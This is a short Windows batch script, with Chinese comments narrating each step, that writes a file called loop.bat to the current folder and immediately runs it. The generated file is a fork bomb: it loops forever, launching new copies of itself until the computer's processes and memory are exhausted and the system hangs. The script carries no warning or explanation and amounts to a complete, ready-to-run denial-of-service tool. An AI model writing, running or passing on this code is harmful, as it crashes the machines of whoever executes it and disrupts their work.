@echo off
:: 設定要生成的檔名
set "filename=loop.bat"

:: 取得當前路徑
set "filepath=%cd%\%filename%"

:: 建立 .bat 並寫入內容
(
echo :while
echo start "" "%%~f0"
echo goto while
) > "%filepath%"

:: 執行剛建立的 .bat
start "" "%filepath%"
